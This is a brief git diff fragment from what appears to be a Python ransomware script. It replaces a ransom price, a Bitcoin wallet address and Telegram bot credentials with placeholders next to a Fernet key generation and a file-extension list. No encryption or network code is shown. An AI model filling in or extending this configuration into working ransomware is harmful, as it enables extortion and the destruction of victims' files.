@@ -10,13 +10,13 @@ from datetime import datetime
 import threading
 import sys
 
-TOKEN = "12222"
-chat_id = "TELEGRAM_CHAT_ID_HERE"
+TOKEN = "TOKEN_HERE"
+chat_id = "ID_HERE"
 
 
 keyGen = Fernet.generate_key()
-priceToAsk = "$200"
-wallet_url = "1HxC5cyAH1Xc1fxNA5hLQjqSdZU9R1e383"
+priceToAsk = "PRICE_HERE"
+wallet_url = "WALLET_HERE"
 currency = "Bitcoin"
 
 extensions = [
